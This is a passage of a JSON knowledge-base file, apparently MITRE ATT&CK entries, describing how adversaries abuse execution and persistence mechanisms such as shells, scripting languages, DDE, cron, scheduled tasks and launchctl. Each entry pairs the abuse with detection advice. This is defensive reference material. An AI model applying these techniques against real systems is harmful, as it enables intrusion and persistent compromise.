        "detection": "\nIf proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.Monitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations). It is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features. An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.\n\n"
      },
      "T1059.002": {
        "name": "AppleScript",
        "description": " \nAdversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.  \nThese AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely. \nScripts can be run from the command-line via  osascript /path/to/script or  osascript -e \"script here\" . Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding  #!/usr/bin/osascript to the start of the script file.  \n\nAppleScripts do not need to call  osascript to execute, however. They may be executed from within mach-O binaries by using the macOS  Native API s  NSAppleScript or  OSAScript , both of which execute code independent of the  /usr/bin/osascript command line utility. \nAdversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute  Native API s, which otherwise would require compilation and execution in a mach-O binary file format.  \n. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via  Python .  \n ",
        "detection": "\nMonitor for execution of AppleScript through osascript and usage of the NSAppleScript and OSAScript APIs that may be related to other suspicious behavior occurring on the system. Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\n"
      },
      "T1059.003": {
        "name": "Windows Command Shell",
        "description": " \nAdversaries may abuse the Windows command shell for execution. The Windows command shell (  cmd.exe ) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. \nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems. \nAdversaries may leverage  cmd.exe to execute various commands and payloads. Common uses include  cmd.exe /c to execute a single command, or abusing  cmd.exe interactively with input and output forwarded over a command and control channel.  ",
        "detection": "\nUsage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.\n\n"
      },
      "T1059.004": {
        "name": "Unix Shell",
        "description": " \nAdversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.  \n \nUnix shells can control every aspect of a system, with certain commands requiring elevated privileges. \nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems. \nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with  SSH . Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.  ",
        "detection": "\nUnix shell usage may be common on administrator, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script. \n\n"
      },
      "T1059.005": {
        "name": "Visual Basic",
        "description": " \nAdversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as  Component Object Model and the  Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.  \n \n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.  \n \nVBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of  JavaScript/JScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).  \n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into  Spearphishing Attachment payloads.  ",
        "detection": "\nMonitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.Understanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent.\n\n"
      },
      "T1059.006": {
        "name": "Python",
        "description": " \nAdversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the  python.exe interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables. \nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.  ",
        "detection": "\nMonitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.\n\n"
      },
      "T1059.007": {
        "name": "JavaScript/JScript",
        "description": " \nAdversaries may abuse JavaScript and/or JScript for execution. JavaScript (JS) is a platform-agnostic scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.  \n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the  Component Object Model and Internet Explorer HTML Application (HTA) pages.  \n \n \n\nAdversaries may abuse JavaScript / JScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a  Drive-by Compromise or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of  Obfuscated Files or Information .  ",
        "detection": "\nMonitor for events associated with scripting execution, such as process activity, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving scripts, or loading of modules associated with scripting languages (ex: JScript.dll). Scripting execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other programmable post-compromise behaviors and could be used as indicators of detection leading back to the source.Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If scripting is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\n"
      },
      "T1059.008": {
        "name": "Network Device CLI",
        "description": " \nAdversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. \nScripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or secure shell (SSH). \nAdversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.  \n ",
        "detection": "\nConsider reviewing command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration. Consider comparing a copy of the network device configuration against a known-good version to discover unauthorized changes to the command interpreter. The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor.\n\n"
      },
      "T1203": {
        "name": "Exploitation for Client Execution",
        "description": " \nAdversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility. \nSeveral types exist: Browser-based Exploitation \nWeb browsers are a common target through  Drive-by Compromise and  Spearphishing Link . Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed. Office Applications \nCommon office and productivity applications such as Microsoft Office are also targeted through  Phishing . Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run. Common Third-party Applications \nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.  ",
        "detection": "\nDetecting software exploitation may be difficult depending on the tools available. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the browser or Office processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.\n\n"
      },
      "T1559": {
        "name": "Inter-Process Communication",
        "description": " \nAdversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows  Dynamic Data Exchange or  Component Object Model . Higher level execution mediums, such as those of  Command and Scripting Interpreter s, may also leverage underlying IPC mechanisms.  ",
        "detection": "\nMonitor for strings in files/commands, loaded DLLs/libraries, or spawned processes that are associated with abuse of IPC mechanisms.\n\n"
      },
      "T1559.001": {
        "name": "Component Object Model",
        "description": " \nAdversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.  \nThrough COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).  \n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and  Visual Basic .  \nSpecific COM objects also exist to directly perform functions beyond code execution, such as creating a  Scheduled Task/Job , fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.  \n \n ",
        "detection": "\nMonitor for COM objects loading DLLs and other modules not typically associated with the application. Enumeration of COM objects, via Query Registry or PowerShell, may also proceed malicious use. Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on. \n\n"
      },
      "T1559.002": {
        "name": "Dynamic Data Exchange",
        "description": " \nAdversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution. \nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by  Component Object Model , DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.  \n  \n  \n\nMicrosoft Office documents can be poisoned with DDE commands  \n  \n, directly or through embedded files  \n, and used to deliver execution via  Phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.  \nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a  Command and Scripting Interpreter .  ",
        "detection": "\nMonitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).OLE and Office Open XML files can be scanned for ‘DDEAUTO', ‘DDE’, and other strings indicative of DDE execution.\n\n"
      },
      "T1106": {
        "name": "Native API",
        "description": " \nAdversaries may directly interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.  \n \nThese native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations. \nFunctionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API  CreateProcess() or GNU  fork() will allow programs and scripts to start other processes.  \n \nThis may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.  \n \n \n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.  \n \n \n \n\nAdversaries may abuse these native API functions as a means of executing behaviors. Similar to  Command and Scripting Interpreter , the native API and its hierarchy of interfaces, provide mechanisms to interact with and utilize various components of a victimized system.  ",
        "detection": "\nMonitoring API calls may generate a significant amount of data and may not be useful for defense unless collected under specific circumstances, since benign use of API functions are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient. Utilization of the Windows API may involve processes loading/accessing system DLLs associated with providing called functions (ex: kernel32.dll, advapi32.dll, user32.dll, and gdi32.dll). Monitoring for DLL loads, especially to abnormal/unusual or potentially malicious processes, may indicate abuse of the Windows API. Though noisy, this data can be combined with other indicators to identify adversary activity. \n\n"
      },
      "T1053": {
        "name": "Scheduled Task/Job",
        "description": " \nAdversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.  \n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).  ",
        "detection": "\nMonitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1053.001": {
        "name": "At (Linux)",
        "description": " \nAdversaries may abuse the  at utility to perform task scheduling for initial or recurring execution of malicious code. The  at command within Linux operating systems enables administrators to schedule tasks.  \n\nAn adversary may use  at in Linux environments to execute programs at system startup or on a scheduled basis for persistence.  at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.  ",
        "detection": "\nMonitor scheduled task creation using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1053.002": {
        "name": "At (Windows)",
        "description": " \nAdversaries may abuse the  at.exe utility to perform task scheduling for initial or recurring execution of malicious code. The  at utility exists as an executable within Windows for scheduling tasks at a specified time and date. Using  at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. \nAn adversary may use  at.exe in Windows environments to execute programs at system startup or on a scheduled basis for persistence.  at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM). \nNote: The  at.exe command line utility has been deprecated in current versions of Windows in favor of  schtasks .  ",
        "detection": "\nMonitor process execution from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.Configure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. Several events will then be logged on scheduled task activity, including: Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registeredEvent ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updatedEvent ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deletedEvent ID 4698 on Windows 10, Server 2016 - Scheduled task createdEvent ID 4700 on Windows 10, Server 2016 - Scheduled task enabledEvent ID 4701 on Windows 10, Server 2016 - Scheduled task disabledTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.\n\n"
      },
      "T1053.003": {
        "name": "Cron",
        "description": " \nAdversaries may abuse the  cron utility to perform task scheduling for initial or recurring execution of malicious code. The  cron utility is a time-based job scheduler for Unix-like operating systems.  The  crontab file contains the schedule of cron entries to be run and the specified times for execution. Any  crontab files are stored in operating system-specific file paths. \nAn adversary may use  cron in Linux or Unix environments to execute programs at system startup or on a scheduled basis for persistence.  cron can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.  ",
        "detection": "\nMonitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc.  Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement. \n\n"
      },
      "T1053.004": {
        "name": "Launchd",
        "description": " \nAdversaries may abuse the  Launchd daemon to perform task scheduling for initial or recurring execution of malicious code. The  launchd daemon, native to macOS, is responsible for loading and maintaining services within the operating system. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in  /System/Library/LaunchDaemons and  /Library/LaunchDaemons   \n. These LaunchDaemons have property list files which point to the executables that will be launched  \n. \nAn adversary may use the  launchd daemon in macOS environments to schedule new executables to run at system startup or on a scheduled basis for persistence.  launchd can also be abused to run a process under the context of a specified account. Daemons, such as  launchd , run with the permissions of the root user account, and will operate regardless of which user account is logged in.  ",
        "detection": "\nMonitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1053.005": {
        "name": "Scheduled Task",
        "description": " \nAdversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The  schtasks can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task. \nThe deprecated  at utility could also be abused by adversaries (ex:  At (Windows) ), though  at.exe can not access tasks created with  schtasks or the Control Panel. \nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).  ",
        "detection": "\nMonitor process execution from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.Configure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. Several events will then be logged on scheduled task activity, including: Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registeredEvent ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updatedEvent ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deletedEvent ID 4698 on Windows 10, Server 2016 - Scheduled task createdEvent ID 4700 on Windows 10, Server 2016 - Scheduled task enabledEvent ID 4701 on Windows 10, Server 2016 - Scheduled task disabledTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.\n\n"
      },
      "T1053.006": {
        "name": "Systemd Timers",
        "description": " \nAdversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension  .timer that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to  Cron in Linux environments.  \n\nEach  .timer file must have a corresponding  .service file with the same name, e.g.,  example.timer and  example.service .  .service files are  Systemd Service unit files that are managed by the systemd system and service manager.  \nPrivileged timers are written to  /etc/systemd/system/ and  /usr/lib/systemd/system while user level are written to  ~/.config/systemd/user/ . \nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.  \n \n \nTimers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.  ",
        "detection": "\nSystemd timer unit files may be detected by auditing file creation and modification events within the /etc/systemd/system, /usr/lib/systemd/system/, and ~/.config/systemd/user/ directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.Suspicious systemd timers can also be identified by comparing results against a trusted system baseline. Malicious systemd timers may be detected by using the systemctl utility to examine system wide timers: systemctl list-timers –all. Analyze the contents of corresponding .service files present on the file system and ensure that they refer to legitimate, expected executables.Audit the execution and command-line arguments of the 'systemd-run' utility as it may be used to create timers.\n\n"
      },
      "T1129": {
        "name": "Shared Modules",
        "description": " \nAdversaries may abuse shared modules to execute malicious payloads. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows  Native API which is called from functions like  CreateProcess ,  LoadLibrary , etc. of the Win32 API.  \n\nThe module loader can load DLLs: \nvia specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory; \nvia EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension); \nvia an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs; \nvia  <file name=\"filename.extension\" loadFrom=\"fully-qualified or relative pathname\"> in an embedded or external \"application manifest\". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT. \nAdversaries may use this functionality as a way to execute arbitrary code on a victim system. For example, malware may execute share modules to load additional components or features.  ",
        "detection": "\nMonitoring DLL module loads may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows modules load functions are common and may be difficult to distinguish from malicious behavior. Legitimate software will likely only need to load routine, bundled DLL modules or Windows system DLLs such that deviation from known module loads may be suspicious. Limiting DLL module loads to %SystemRoot% and %ProgramFiles% directories will protect against module loads from unsafe paths. Correlation of other events with behavior surrounding module loads using API monitoring and suspicious DLLs written to disk will provide additional context to an event that may assist in determining if it is due to malicious behavior.\n\n"
      },
      "T1072": {
        "name": "Software Deployment Tools",
        "description": " \nAdversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.). \nAccess to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints. \nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.  ",
        "detection": "\nDetection methods will vary depending on the type of third-party software or system and how it is typically used. The same investigation process can be applied here as with other potentially malicious activities where the distribution vector is initially unknown but the resulting activity follows a discernible pattern. Analyze the process execution trees, historical activities from the third-party application (such as what types of files are usually pushed), and the resulting activities or events from the file/binary/script pushed to systems. Often these third-party applications will have logs of their own that can be collected and correlated with other data from the environment. Ensure that third-party application logs are on-boarded to the enterprise logging system and the logs are regularly reviewed. Audit software deployment logs and look for suspicious or unauthorized activity. A system not typically used to push software to clients that suddenly is used for such a task outside of a known admin function may be suspicious. Monitor account login activity on these applications to detect suspicious/abnormal usage.Perform application deployment at regular times so that irregular deployment activity stands out. Monitor process activity that does not correlate to known good software. Monitor account login activity on the deployment system.\n\n"
      },
      "T1569": {
        "name": "System Services",
        "description": " \nAdversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services. Many services are set to run at boot, which can aid in achieving persistence (  Create or Modify System Process ), but adversaries can also abuse services for one-time or temporary execution.  ",
        "detection": "\nMonitor for command line invocations of tools capable of modifying services that doesn’t correspond to normal usage patterns and known software, patch cycles, etc. Also monitor for changes to executables and other files associated with services. Changes to Windows services may also be reflected in the Registry.\n\n\n\n\n\n\n\n\n\n\n"
      },
      "T1569.001": {
        "name": "Launchctl",
        "description": " \nAdversaries may abuse launchctl to execute commands or programs. Launchctl controls the macOS launchd process, which handles things like  Launch Agent s and  Launch Daemon s, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.  \n\nBy loading or reloading  Launch Agent s or  Launch Daemon s, adversaries can install persistence or execute changes they made.  \n\nRunning a command from launchctl is as simple as  launchctl submit -l -- /Path/to/thing/to/execute \"arg\" \"arg\" \"arg\" . Adversaries can abuse this functionality to execute code or even bypass application control if launchctl is an allowed process.  ",
        "detection": "\nKnockKnock can be used to detect persistent programs such as those installed via launchctl as launch agents or launch daemons. Additionally, every launch agent or launch daemon must have a corresponding plist file on disk which can be monitored. Monitor process execution from launchctl/launchd for unusual or unknown processes.\n\n"
      },
      "T1569.002": {
        "name": "Service Execution",
        "description": " \nAdversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (  services.exe ) is an interface to manage and manipulate services.  \nThe service control manager is accessible to users via GUI components as well as system utilities such as  sc.exe and  Net . \n PsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.  \n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with  Windows Service during service persistence or privilege escalation.  ",
        "detection": "\nChanges to service Registry entries and command line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool PsExec.\n\n"
      },
      "T1204": {
        "name": "User Execution",
        "description": " \nAn adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of  Phishing . \nWhile  User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after  Internal Spearphishing .  ",
